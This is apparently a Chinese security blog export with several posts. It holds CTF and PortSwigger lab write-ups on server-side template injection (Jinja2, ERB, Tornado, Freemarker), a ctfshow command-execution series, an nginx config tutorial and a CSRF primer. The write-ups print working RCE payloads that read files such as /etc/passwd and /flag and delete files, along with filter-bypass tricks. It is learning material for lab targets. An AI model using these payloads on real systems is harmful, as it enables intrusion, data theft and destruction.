&#123;% set space = ((&#123; &#125;|select|string|list).pop(10)|string) %&#125;&#123;&#123;spa&#125;&#125;    # 空格&#123;% set xhx = ((&#123; &#125;|select|string|list).pop(24)|string) %&#125;&#123;&#123;xhx&#125;&#125;    # _&#123;% set zero = ((&#123; &#125;|select|string|list).pop(38)|int) %&#125;&#123;&#123;zero&#125;&#125;    # 0&#123;% set seven = ((&#123; &#125;|select|string|list).pop(40)|int) %&#125;&#123;&#123;seven&#125;&#125;    # 7......

这里，其实有了数字0之后，我们便可以依次将其余的数字全部构造出来，原理就是加减乘除、平方等数学运算，如下示例：
&#123;% set zero = ((&#123; &#125;|select|string|list).pop(38)|int) %&#125;    # 0&#123;% set one = (zero**zero)|int %&#125;&#123;&#123;one&#125;&#125;    # 1&#123;%set two = (zero-one-one)|abs %&#125;    # 2&#123;%set three = (zero-one-one-one)|abs %&#125;    # 3&#123;% set five = (two*two*two)-one-one-one %&#125;    # 5#  &#123;%set four = (one+three) %&#125;    注意, 这样的加号的是不行的,不知道为什么,只能用减号配合abs取绝对值了......


通过上述原理，我们可以依次获得构造payload所需的特殊字符与字符串：
# 首先构造出所需的数字:&#123;% set zero = ((&#123; &#125;|select|string|list).pop(38)|int) %&#125;    # 0&#123;% set one = (zero**zero)|int %&#125;    # 1&#123;% set two = (zero-one-one)|abs %&#125;    # 2&#123;% set four = (two*two)|int %&#125;    # 4&#123;% set five = (two*two*two)-one-one-one %&#125;    # 5&#123;% set seven = (zero-one-one-five)|abs %&#125;    # 7# 构造出所需的各种字符与字符串:&#123;% set xhx = ((&#123; &#125;|select|string|list).pop(24)|string) %&#125;    # _&#123;% set space = ((&#123; &#125;|select|string|list).pop(10)|string) %&#125;    # 空格&#123;% set point = ((app.__doc__|string|list).pop(26)|string) %&#125;    # .&#123;% set yin = ((app.__doc__|string|list).pop(195)|string) %&#125;    # 单引号 &#x27;&#123;% set left = ((app.__doc__|string|list).pop(189)|string) %&#125;    # 左括号 (&#123;% set right = ((app.__doc__|string|list).pop(200)|string) %&#125;    # 右括号 )&#123;% set c = dict(c=aa)|reverse|first %&#125;    # 字符 c&#123;% set bfh = self|string|urlencode|first %&#125;    # 百分号 %&#123;% set bfhc=bfh~c %&#125;    # 这里构造了%c, 之后可以利用这个%c构造任意字符。~用于字符连接&#123;% set slas = bfhc%((four~seven)|int) %&#125;    # 使用%c构造斜杠 /，使用某种格式化操作（%c），这在很多编程语言中用于将一个整数转换为其对应的字符。在ASCII码表中，整数 47 对应的字符是斜杠（/）&#123;% set but = dict(buil=aa,tins=dd)|join %&#125;    # builtins&#123;% set imp = dict(imp=aa,ort=dd)|join %&#125;    # import&#123;% set pon = dict(po=aa,pen=dd)|join %&#125;    # popen&#123;% set os = dict(o=aa,s=dd)|join %&#125;    # os&#123;% set ca = dict(ca=aa,t=dd)|join %&#125;    # cat&#123;% set flg = dict(fl=aa,ag=dd)|join %&#125;    # flag&#123;% set ev = dict(ev=aa,al=dd)|join %&#125;    # eval&#123;% set red = dict(re=aa,ad=dd)|join %&#125;    # read&#123;% set bul = xhx*2~but~xhx*2 %&#125;    # __builtins__

将上面构造的字符或字符串拼接起来构造出 __import__(&#39;os&#39;).popen(&#39;cat /flag&#39;).read()：
&#123;% set pld = xhx*2~imp~xhx*2~left~yin~os~yin~right~point~pon~left~yin~ca~space~slas~flg~yin~right~point~red~left~right %&#125;

然后将上面构造的各种变量添加到SSTI万能payload里面就行了：
&#123;% for f,v in whoami.__init__.__globals__.items() %&#125;    # globals    &#123;% if f == bul %&#125;         &#123;% for a,b in v.items() %&#125;    # builtins            &#123;% if a == ev %&#125;    # eval                &#123;&#123;b(pld)&#125;&#125;    # eval(&quot;__import__(&#x27;os&#x27;).popen(&#x27;cat /flag&#x27;).read()&quot;)            &#123;% endif %&#125;        &#123;% endfor %&#125;    &#123;% endif %&#125;&#123;% endfor %&#125;

所以最终的payload为：
&#123;% set zero = ((&#123; &#125;|select|string|list).pop(38)|int) %&#125;&#123;% set one = (zero**zero)|int %&#125;&#123;% set two = (zero-one-one)|abs|int %&#125;&#123;% set four = (two*two)|int %&#125;&#123;% set five = (two*two*two)-one-one-one %&#125;&#123;% set seven = (zero-one-one-five)|abs %&#125;&#123;% set xhx = ((&#123; &#125;|select|string|list).pop(24)|string) %&#125;&#123;% set space = ((&#123; &#125;|select|string|list).pop(10)|string) %&#125;&#123;% set point = ((app.__doc__|string|list).pop(26)|string) %&#125;&#123;% set yin = ((app.__doc__|string|list).pop(195)|string) %&#125;&#123;% set left = ((app.__doc__|string|list).pop(189)|string) %&#125;&#123;% set right = ((app.__doc__|string|list).pop(200)|string) %&#125;&#123;% set c = dict(c=aa)|reverse|first %&#125;&#123;% set bfh=self|string|urlencode|first %&#125;&#123;% set bfhc=bfh~c %&#125;&#123;% set slas = bfhc%((four~seven)|int) %&#125;&#123;% set but = dict(buil=aa,tins=dd)|join %&#125;&#123;% set imp = dict(imp=aa,ort=dd)|join %&#125;&#123;% set pon = dict(po=aa,pen=dd)|join %&#125;&#123;% set os = dict(o=aa,s=dd)|join %&#125;&#123;% set ca = dict(ca=aa,t=dd)|join %&#125;&#123;% set flg = dict(fl=aa,ag=dd)|join %&#125;&#123;% set ev = dict(ev=aa,al=dd)|join %&#125;&#123;% set red = dict(re=aa,ad=dd)|join %&#125;&#123;% set bul = xhx*2~but~xhx*2 %&#125;&#123;% set pld = xhx*2~imp~xhx*2~left~yin~os~yin~right~point~pon~left~yin~ca~space~slas~flg~yin~right~point~red~left~right %&#125;&#123;% for f,v in whoami.__init__.__globals__.items() %&#125;&#123;% if f == bul %&#125;&#123;% for a,b in v.items() %&#125;&#123;% if a == ev %&#125;&#123;&#123;b(pld)&#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;&#123;% endif %&#125;&#123;% endfor %&#125;

拿去执行，成功执行命令并得到了flag
过滤了request和class这里除了用上面中括号或 |attr() 那几种方法外，我们还可以利用flask里面的session对象和config对象来逃逸这一姿势。
下面通过NCTF2018的两道flask题目来仔细讲解。
[NCTF2018]flask真香打开题目一看，是一个炫酷的demo演示，这种demo一般是没有啥东西好挖的。首先F12信息收集，发现Python版本是3.5.2，没有Web静态服务器。

随便点开第二个demo发现404了，这里注意到404界面是Flask提供的404界面，按照以往的经验，猜测这里存在SSTI注入。
先尝试简单的payload：


从这里可见，毫无疑问的存在SSTI漏洞了。
那么就来康康到底有没有WAF，有的话被过滤了哪些。经过一番测试，确实很多东西都被过滤了，而且是正则表达式直接匹配删去，无法嵌套绕过。不完整测试有以下：
configclassmroargsrequestopenevalbuiltinsimport

从这里来看，似乎已经完全无法下手了。因为request和class都被过滤掉了。
卡在这里以后，最好的办法就是去查Flask官方文档了。从Flask官方文档里，找到了session对象，经过测试没有被过滤。更巧的是，session一定是一个dict对象，因此我们可以通过键的方法访问相应的类。由于键是一个字符串，因此可以通过字符串拼接绕过。
python：
&#123;&#123;session[&#x27;__cla&#x27;+&#x27;ss__&#x27;]&#125;&#125;


访问到了类，我们就可以通过 __bases__ 来获取基类的元组，带上索引0就可以访问到相应的基类。由此一直向上我们就可以访问到最顶层的object基类了。（同样的，如果没有过滤config的话，我们还可以利用config来逃逸，方法与session的相同）
payload：
&#123;&#123;session[&#x27;__cla&#x27;+&#x27;ss__&#x27;].__bases__[0].__bases__[0].__bases__[0].__bases__[0]&#125;&#125;


有了对象基类，我们就可以通过访问 __subclasses__ 方法再实例化去访问所有的子类。同样使用字符串拼接绕过WAF，这样就实现沙箱逃逸了。
payload：
&#123;&#123;session[&#x27;__cla&#x27;+&#x27;ss__&#x27;].__bases__[0].__bases__[0].__bases__[0].__bases__[0][&#x27;__subcla&#x27;+&#x27;ss__&#x27;]()&#125;&#125;


SSTI目的无非就是两个：文件读写、执行命令。因此我们核心应该放在file类和os类。而坑爹的是，Python3几乎换了个遍。因此这里得去看官方文档去找相应的基类的用处。
我还是从os库入手，直接搜索“os”，找到了 os._wrap_close 类，同样使用dict键访问的方法。猜大致范围得到了索引序号，我这里序号是312，
payload：
&#123;&#123;session[&#x27;__cla&#x27;+&#x27;ss__&#x27;].__bases__[0].__bases__[0].__bases__[0].__bases__[0][&#x27;__subcla&#x27;+&#x27;sses__&#x27;]()[312]&#125;&#125;


我们调用它的 __init__ 函数将其实例化，然后用 __globals__ 查看其全局变量。
payload：
&#123;&#123;session[&#x27;__cla&#x27;+&#x27;ss__&#x27;].__bases__[0].__bases__[0].__bases__[0].__bases__[0][&#x27;__subcla&#x27;+&#x27;sses__&#x27;]()[312].__init__.__globals__&#125;&#125;


眼又花了，但我们的目的很明显，就是要执行命令，于是直接搜索 “popen” 就可以了：

由于又是一个dict类型，我们调用的时候又可以使用字符串拼接，绕过open过滤。
后面顺理成章的，我们将命令字符串传入，实例化这个函数，然后直接调用read方法就可以了。
payload：
&#123;&#123;session[&#x27;__cla&#x27;+&#x27;ss__&#x27;].__bases__[0].__bases__[0].__bases__[0].__bases__[0][&#x27;__subcla&#x27;+&#x27;sses__&#x27;]()[312].__init__.__globals__[&#x27;po&#x27;+&#x27;pen&#x27;](&#x27;ls /&#x27;).read()&#125;&#125;


&#123;&#123;session[&#x27;__cla&#x27;+&#x27;ss__&#x27;].__bases__[0].__bases__[0].__bases__[0].__bases__[0][&#x27;__subcla&#x27;+&#x27;sses__&#x27;]()[312].__init__.__globals__[&#x27;po&#x27;+&#x27;pen&#x27;](&#x27;cat /Th1s__is_S3cret&#x27;).read()&#125;&#125;


BP-Lab: Basic server-side template injection(ERB模板)题目要求：要解决实验问题，请查看 ERB 文档以了解如何执行任意代码，然后从 Carlos 的主目录中删除该 morale.txt 文件
首先在hacktricks上面搜索ERB，结果为：https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection#erb-ruby
该语法 &lt;%= someExpression %&gt; 用于计算表达式并在页面上呈现结果，几种基本操作如下：

当点击第一个商品的时候，页面提示如下：

猜测存在ERB漏洞，于是开始尝试，首先输入 &lt;%= system(&quot;whoami&quot;) %&gt;，发现正在题目要求的Carols目录下面，于是我们执行第二个代码直接删除所需删除的文件：&lt;%= system(&quot;rm ./morale.txt&quot;) %&gt;，解决题目
BP-Lab: Basic server-side template injection(code context)(Tornado模板)题目要求：请查看 Tornado 文档以了解如何执行任意代码，然后从 Carlos 的主目录中删除该 morale.txt 文件
Tornado模板：https://ajinabraham.com/blog/server-side-template-injection-in-tornado
先进入一篇文章发表了一条评论，然后登录我的账户，更改网站希望使用您的全名、名字或昵称，更改完后刷新评论区发现名字会随着我的更改而改变，存在模板注入，抓包尝试一下：

发现评论区名字后面会跟着47，确认存在漏洞，接着操作

位于Carlos目录下，继续操作删除要求的文件：

BP-Lab: Basic server-side template injection using documentation(Freemarker模板)题目要求：请确定模板引擎并使用文档来了解如何执行任意代码，然后从 Carlos 的主目录中删除该 morale.txt 文件
我们先登录题目提供的账号，然后进入随便一个商品滑到最下面点击修改模板（英语版的），进入一个页面开始修改，改模板的语法是  $&#123;语句&#125;，如果我们的语句填入的是不存在的对象，保存后页面会报错，从报错信息中得到改模板为Freemarker，于是上hacktricks搜索相关漏洞（当然题目要求的是自己查阅文档解决，不是这样子的），得到如下结果：
其中，new() 可用于创建实现接口的 TemplateModel 任意 Java 对象，有一个名为 Execute 的类，可用于执行任意 shell 命令，开始构造：&lt;#assign ex = &quot;freemarker.template.utility.Execute&quot;?new()&gt;$&#123; ex(&quot;id&quot;)&#125;，确定所处目录是Carlos，于是删除要求的文件：&lt;#assign ex = &quot;freemarker.template.utility.Execute&quot;?new()&gt;$&#123; ex(&quot;rm ./morale.txt&quot;)&#125;，题目解决
Lab: Server-side template injection in an unknown language with a documented exploit题目要求：请确定模板引擎并在线查找可用于执行任意代码的文档漏洞，然后从 Carlos 的主目录中删除该 morale.txt 文件
进入实验室后我们先点击第一个商品，回显跟第一题一模一样，所以现在我们需要确定使用的是哪种模板，于是输入 $&#123;&#123;]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>ssti</tag>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title>服务器上配置重定向文件</title>
    <url>/2024/05/19/%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%B8%8A%E9%85%8D%E7%BD%AE%E9%87%8D%E5%AE%9A%E5%90%91%E6%96%87%E4%BB%B6/</url>
    <content><![CDATA[参考资料Nginx入门必须懂3大功能配置 - Web服务器&#x2F;反向代理&#x2F;负载均衡
云服务器配置重定向文件
Ubuntu 自建安装Apache+MySQL+PHP环境
安装MySQL和PHP环境按照上面的参考文章走
配置nginx首先先安装nginx：apt install nginx
查看版本：nginx -v
运行nginx：service nginx status
先让我们进入：cd /etc/nginx，然后 ls -lh可以看到目录下面有sites-enabled文件
sites-enabled：很明显这个目录可以写配置
sites-availabled：这个一般来说就不行了
https://www.jianshu.com/p/42c4ffd044e6
看不懂，先这样理解。
配置代码可以利用WinSCP软件来帮助我们创建并修改文件
在enabled下创建port_sherlock(这只是一个名称.jpg)，代码如下：
server&#123;	listen port;	server_name IP;	root /var/www/html;	index sherlock.php;		location / &#123;		try_files $uri $uri/ =404;	&#125;	location ~ \.php$ &#123;		include snippets/fastcgi-php.conf;       fastcgi_pass unix:/var/run/php/php8.3-fpm.sock;  			# 确保这里的版本号与安装的PHP版本匹配	&#125;	location ~ /\.ht &#123;        deny all;    &#125;&#125;

server 块server &#123;

这个块定义了一个虚拟服务器的配置，所有的配置指令都在这个块内。
listen 指令listen 614;

listen 指令指定Nginx监听的端口号。在这个例子中，Nginx将监听614端口。
server_name 指令server_name IP;

server_name 指令指定了这个虚拟服务器的服务器名称或IP地址。在这个例子中，服务器名称是 120.26.138.45。
root 指令root /var/www/html;

root 指令设置了服务器根目录。在这个例子中，根目录是 /var/www/html，即所有的请求文件都相对于这个目录。
index 指令index redirect.php;

index 指令指定了默认的索引文件。在这个例子中，当访问根目录时，默认文件是 redirect.php。
location &#x2F; 块location / &#123;    try_files $uri $uri/ =404;&#125;

location / 块定义了对根路径的请求处理方式。try_files 指令尝试按顺序查找文件：

$uri：请求的URI。
$uri/：请求的URI作为目录。
=404：如果前两个都找不到，返回404错误。

location ~ .php$ 块location ~ \.php$ &#123;    include snippets/fastcgi-php.conf;    fastcgi_pass unix:/var/run/php/php8.3.6-fpm.sock;  # 确保这里的版本号与安装的PHP版本匹配&#125;

location ~ \.php$ 块定义了对PHP文件的请求处理方式：

include snippets/fastcgi-php.conf：包含了FastCGI的配置片段。
fastcgi_pass unix:/var/run/php/php8.3.6-fpm.sock：将PHP请求传递给PHP-FPM服务，通过Unix套接字通信。这里的版本号需要与实际安装的PHP版本匹配。

location ~ &#x2F;.ht 块location ~ /\.ht &#123;    deny all;&#125;

location ~ /\.ht 块定义了对以 .ht 开头的文件的请求处理方式：

deny all：拒绝所有访问。这通常用于保护 .htaccess 文件，不让它们被外部访问。

善后检查配置是否错误：
nginx -t

重载：
systemctl reload nginx

]]></content>
      <categories>
        <category>服务器</category>
      </categories>
  </entry>
  <entry>
    <title>命令执行刷题</title>
    <url>/2024/03/30/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%88%B7%E9%A2%98/</url>
    <content><![CDATA[q
前言在刷命令执行的题目之前，建议先仔细阅读一下这篇文章：CTF中常见RCE命令执行绕过技巧
ctfshow-web29&lt;?phperror_reporting(0);if(isset($_GET[&#x27;c&#x27;]))&#123;    $c = $_GET[&#x27;c&#x27;];    if(!preg_match(&quot;/flag/i&quot;, $c))&#123;        eval($c);    &#125;    &#125;else&#123;    highlight_file(__FILE__);&#125;

首先 ?c=system(&#39;ls&#39;);查看当前目录下的文件，发现了flag.php
由于题目所限，可以使用通配符来绕过?c=system(%27cat%20./fla?.php);，右键查看源码得到flag
ctfshow-web30&lt;?phperror_reporting(0);if(isset($_GET[&#x27;c&#x27;]))&#123;    $c = $_GET[&#x27;c&#x27;];    if(!preg_match(&quot;/flag|system|php/i&quot;, $c))&#123;        eval($c);    &#125;    &#125;else&#123;    highlight_file(__FILE__);&#125;

使用另一个可以执行外部命令的函数来代替system函数，但是要注意exec函数只能返回最后一行的数据，这边使用的passthru函数
?c=passthru(&#39;ls&#39;);：得到当前目录下的文件
?c=passthru(&#39;cat ./fla*&#39;);：邮件查看源码得到flag
ctfshow-web31&lt;?phperror_reporting(0);if(isset($_GET[&#x27;c&#x27;]))&#123;    $c = $_GET[&#x27;c&#x27;];    if(!preg_match(&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;/i&quot;, $c))&#123;        eval($c);    &#125;    &#125;else&#123;    highlight_file(__FILE__);&#125;

从所提供的代码里面不难知道只检查变量c内的内容，所以我们可以再嵌套一个eval函数来绕过
?c=eval($_GET[cmd]);&amp;cmd=system(&#39;ls&#39;);：得到当前目录下的文件名
?c=eval($_GET[cmd]);&amp;cmd=system(&#39;cat flag.php&#39;);：右键查看源码得到flag
ctfshow-web32&amp;33&amp;34&amp;35&amp;36几道题之前的区别无非就是黑名单的内容，但是都可以用以下两种方式来绕过
&lt;?phperror_reporting(0);if(isset($_GET[&#x27;c&#x27;]))&#123;    $c = $_GET[&#x27;c&#x27;];    if(!preg_match(&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(/i&quot;, $c))&#123;        eval($c);    &#125;    &#125;else&#123;    highlight_file(__FILE__);&#125;

来个非预期
首先尝试一下能不能文件包含，?c=include$_GET[a]?&gt;&amp;a=/etc/passwd，读取成功，可以文件包含
通过响应头得知为nginx，所以日志文件位于/var/log/nginx/access.log，成功读取，然后我们便可以利用日志文件来进行文件包含，具体操作如下图所示：

接下来就是读取文件，得到flag
当然上面由于日志文件的原因在实际操作中比较少见，所以再来个预期解
?c=include$_GET[1]?&gt;&amp;1=php://filter/convert.base64-encode/resource=flag.php

ctfshow-web37&amp;38&lt;?phperror_reporting(0);if(isset($_GET[&#x27;c&#x27;]))&#123;    $c = $_GET[&#x27;c&#x27;];    if(!preg_match(&quot;/flag/i&quot;, $c))&#123;        include($c);        echo $flag;        &#125;        &#125;else&#123;    highlight_file(__FILE__);&#125;

第一种
利用include来进行日志包含，得到flag
第二种
利用php伪协议，如下
?c=data://text/plain;base64,PD9waHAgc3lzdGVtKCdscyAnKTs/Pg==：得到当前目录下的文件名
?c=data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs/Pg==：得到flag
ctfshow-web39&lt;?php//flag in flag.phperror_reporting(0);if(isset($_GET[&#x27;c&#x27;]))&#123;    $c = $_GET[&#x27;c&#x27;];    if(!preg_match(&quot;/flag/i&quot;, $c))&#123;        include($c.&quot;.php&quot;);    &#125;        &#125;else&#123;    highlight_file(__FILE__);&#125;

看到.php位于include函数，最开始想着是把它给注释掉，用//，然后使用伪协议来绕过，但是当一切的代码都base64编码后很奇怪地没有起作用，于是我就直接不编码，直接运行，成功了，如下
?c=data://text/plain,&lt;?php system(&#39;cat fla?.php&#39;);?&gt;//：查看源码得到flag
但是查看源码的时候发现后面的.php并没有被注释掉，尝试去掉注释符发现还是可以，查看源码.php直接为html所显示的内容
查看题解得知include函数只会执行&lt;?php?&gt;里面的内容
ctfshow-web40&lt;?phpif(isset($_GET[&#x27;c&#x27;]))&#123;    $c = $_GET[&#x27;c&#x27;];    if(!preg_match(&quot;/[0-9]|\~|\`|\@|\#|\\$|\%|\^|\&amp;|\*|\（|\）|\-|\=|\+|\&#123;|\[|\]|\&#125;|\:|\&#x27;|\&quot;|\,|\&lt;|\.|\&gt;|\/|\?|\\\\/i&quot;, $c))&#123;        eval($c);    &#125;        &#125;else&#123;    highlight_file(__FILE__);&#125;

不会做，查看题解
法一
c&#x3D;eval(array_pop(next(get_defined_vars())));&#x2F;&#x2F;需要POST传入参数为1&#x3D;system(‘tac fl*’);
get_defined_vars() 返回一个包含所有已定义变量的多维数组。这些变量包括环境变量、服务器变量和用户定义的变量，例如GET、POST、FILE等等。
next()将内部指针指向数组中的下一个元素，并输出。
array_pop() 函数删除数组中的最后一个元素并返回其值。
法二
c&#x3D;show_source(next(array_reverse(scandir(pos(localeconv()))))); 或者 c&#x3D;show_source(next(array_reverse(scandir(getcwd()))));
getcwd() 函数返回当前工作目录。它可以代替pos(localeconv())
localeconv()：返回包含本地化数字和货币格式信息的关联数组。这里主要是返回值为数组且第一项为”.”
pos():输出数组第一个元素，不改变指针；
current() 函数返回数组中的当前元素（单元）,默认取第一个值，和pos()一样
scandir() 函数返回指定目录中的文件和目录的数组。这里因为参数为”.”所以遍历当前目录
array_reverse():数组逆置
next():将数组指针指向下一个，这里其实可以省略倒置和改变数组指针，直接利用[2]取出数组也可以
show_source():查看源码
pos() 函数返回数组中的当前元素的值。该函数是current()函数的别名。
每个数组中都有一个内部的指针指向它的”当前”元素，初始指向插入到数组中的第一个元素。
提示：该函数不会移动数组内部指针。
相关的方法：
current()返回数组中的当前元素的值。
end()将内部指针指向数组中的最后一个元素，并输出。
next()将内部指针指向数组中的下一个元素，并输出。
prev()将内部指针指向数组中的上一个元素，并输出。
reset()将内部指针指向数组中的第一个元素，并输出。
each()返回当前元素的键名和键值，并将内部指针向前移动
ctfshow-web42&lt;?phpif(isset($_GET[&#x27;c&#x27;]))&#123;    $c=$_GET[&#x27;c&#x27;];    system($c.&quot; &gt;/dev/null 2&gt;&amp;1&quot;);&#125;else&#123;    highlight_file(__FILE__);&#125;

 &gt;/dev/null 2&gt;&amp;1将标准输出和标准错误重定向到 /dev/null，这样就会忽略这些输出，不会显示在页面上，并且这个也是访问不了的
使用 “ ; “ “ || “ “ &amp; “ “ &amp;&amp; “ 分隔

; &#x2F;&#x2F;分号| &#x2F;&#x2F;只执行后面那条命令|| &#x2F;&#x2F;只执行前面那条命令&amp; &#x2F;&#x2F;两条命令都会执行&amp;&amp; &#x2F;&#x2F;两条命令都会执行

get传参的话&amp;需要进行编码
?c=ls;：查看当前目录下的文件
?c=cat flag.php;：查看源码得到flag
ctfshow-web43&lt;?phpif(isset($_GET[&#x27;c&#x27;]))&#123;    $c=$_GET[&#x27;c&#x27;];    if(!preg_match(&quot;/\;|cat/i&quot;, $c))&#123;        system($c.&quot; &gt;/dev/null 2&gt;&amp;1&quot;);    &#125;&#125;else&#123;    highlight_file(__FILE__);&#125;

过滤掉了cat函数，所以我们就是用tac函数来打印文件内容
剩下的跟上题操作一样
ctfshow-web44&lt;?phpif(isset($_GET[&#x27;c&#x27;]))&#123;    $c=$_GET[&#x27;c&#x27;];    if(!preg_match(&quot;/;|cat|flag/i&quot;, $c))&#123;        system($c.&quot; &gt;/dev/null 2&gt;&amp;1&quot;);    &#125;&#125;else&#123;    highlight_file(__FILE__);&#125;

这题读取文件函数用tac，flag.php文件用通配符来代替，剩下步骤与上题一致
ctfshow-web45（替代空格）&amp;46&amp;47&amp;48&amp;49几题之间的差别就是黑名单的不同，但是都可以用以下操作实现绕过
&lt;?phpif(isset($_GET[&#x27;c&#x27;]))&#123;    $c=$_GET[&#x27;c&#x27;];    if(!preg_match(&quot;/\;|cat|flag| /i&quot;, $c))&#123;        system($c.&quot; &gt;/dev/null 2&gt;&amp;1&quot;);    &#125;&#125;else&#123;    highlight_file(__FILE__);&#125;

用%09或者$IFS$9来替代空格，其实就是tab的url编码形式，但是直接按tab键会使光标跳到分隔符之后或者跳在历史记录中的下一条记录
剩下操作与前面无差
web-50&amp;web51web50&lt;?phpif(isset($_GET[&#x27;c&#x27;]))&#123;    $c=$_GET[&#x27;c&#x27;];    if(!preg_match(&quot;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`|\%|\x09|\x26/i&quot;, $c))&#123;        system($c.&quot; &gt;/dev/null 2&gt;&amp;1&quot;);    &#125;&#125;else&#123;    highlight_file(__FILE__);&#125;

这题可以拿来替代空格的式子全部都被过滤掉了，所以我们需要另辟蹊径
上网查阅可知&lt;,&lt;&gt;也是可以替代空格的，所以我们可以构造出这样的payload：?c=tac&lt;fla&#39;&#39;g.php||
web51这道题多过滤了一个tac，但是问题不大，已知ca&#39;&#39;t依然可以起到本该有的作用
所以构造payload为：?c=ta&#39;&#39;c&lt;fla&#39;&#39;g.php||
web-52&amp;web-53&lt;?phpif(isset($_GET[&#x27;c&#x27;]))&#123;    $c=$_GET[&#x27;c&#x27;];    if(!preg_match(&quot;/\;|cat|flag| |[0-9]|\*|more|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;, $c))&#123;        system($c.&quot; &gt;/dev/null 2&gt;&amp;1&quot;);    &#125;&#125;else&#123;    highlight_file(__FILE__);&#125;

这题我们就需要另一种式子来替代空格，即$IFS
除了这个外该题还有一个坑，就是直接ls的话你会看到一个flag文件，但是打印的时候打印不出flag，其实真正的flag存在根目录处
payload为：?c=ca\t$IFS/fla&#39;&#39;g||，得到flag
web-53
这题只需要替代空格的式子改为${IFS}便可以了，但是不知道为什么$IFS这个不行，猜测可能是其字母会和后面的文件名混起来，起不到作用
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
  </entry>
  <entry>
    <title></title>
    <url>/2023/10/05/%E7%AC%AC%E4%B8%80%E7%AF%87%E5%8D%9A%E5%AE%A2/</url>
    <content><![CDATA[
]]></content>
  </entry>
  <entry>
    <title>CSRF漏洞学习</title>
    <url>/2024/04/23/CSRF%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0_max/CSRF%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[参考及引用的文章浅谈csrf漏洞：https://xz.aliyun.com/t/7450?time__1311=n4%2BxnD0G0%3Dit0QDkID%2FiWRSD0xcDRlGerDWwD&amp;alichlgref=https%3A%2F%2Fwww.google.com%2F#toc-3
CSRF漏洞的原理CSRF漏洞产生的原因(1)http协议使用session在服务端保存用户的个人信息,客户端浏览器用cookie标识用户身份;
(2)cookie的认证只能确保是某个用户发送的请求,但是不能保证这个请求是否是”用户自愿的行为”.
(3)这时,用户登录了某个web站点,同时点击了包含CSRF恶意代码的URL,就会触发CSRF
漏洞利用的条件(1)用户必须登录A网站,生成了cookie
(2)登录的同时访问了恶意URL(包含CSRF恶意代码的URL)
换种解释就是网站的cookie在浏览器中不会过期，只要不关闭浏览器或者退出登录，那以后只要是访问这个网站，都会默认你已经登录的状态。而在这个期间，攻击者发送了构造好的csrf脚本或包含csrf脚本的链接，可能会执行一些用户不想做的功能（比如是添加账号等）
CSRF和XSS的不同(1)XSS主要是获取用户的cookie信息,达到控制客户端的目的
XSS—-&gt;把你的腰牌(用户身份象征也就是cookie)偷到手,黑客自己去搞破坏.
CSRF主要是劫持用户身份,让客户端做一些不愿意做的事.
CSRF—-&gt;拿刀劫持你,”借助你的身份”来帮黑客做事.
(2)危害上来说,XSS更大;
(3)从应用难度上来说
CSRF需要满足登录某网站的状态,同时访问了恶意的URL,应用条件比较苛刻.
XSS只要一次点击或者存储到服务器即可.
CSRF漏洞检测检测CSRF漏洞是一项比较繁琐的工作，最简单的方法就是抓取一个正常请求的数据包，去掉Referer字段后再重新提交，如果该提交还有效，那么基本上可以确定存在CSRF漏洞
随着对CSRF漏洞研究的不断深入，不断涌现出一些专[门针对CSRF漏洞进行检测的工具,如CSRFTester, CSRF Request Builder等。
以CSRFTester工具为例，CSRF漏洞检测工具的测试原理如下：使用CSRFTester进行测试时，首先需要抓取我们在浏览器中访问过的所有链接以及所有的表单等信息，然后通过在CSRFTester中修改相应的表单等信息，重新提交，这相当于一次伪造客户端请求。如果修改后的测试请求成功被网站服务器接受，则说明存在CSRF漏洞，当然此款工具也可以被用来进行CSRF攻击
DVWA-CSRFLow级别&lt;?phpif( isset( $_GET[ &#x27;Change&#x27; ] ) ) &#123;    // Get input    $pass_new  = $_GET[ &#x27;password_new&#x27; ];    $pass_conf = $_GET[ &#x27;password_conf&#x27; ];    // Do the passwords match?    if( $pass_new == $pass_conf ) &#123;        // They do!        $pass_new = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $pass_new ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));        $pass_new = md5( $pass_new );        // Update the database        $insert = &quot;UPDATE `users` SET password = &#x27;$pass_new&#x27; WHERE user = &#x27;&quot; . dvwaCurrentUser() . &quot;&#x27;;&quot;;        $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $insert ) or die( &#x27;&lt;pre&gt;&#x27; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#x27;&lt;/pre&gt;&#x27; );//这行代码执行了SQL查询，更新数据库中的用户密码。如果执行失败，将会输出错误信息        // Feedback for the user        echo &quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;;    &#125;    else &#123;        // Issue with passwords matching        echo &quot;&lt;pre&gt;Passwords did not match.&lt;/pre&gt;&quot;;    &#125;    ((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res);//关闭MySQL连接，并返回关闭操作的结果。如果关闭操作成功，返回true；如果关闭操作失败，返回false。&#125;?&gt;


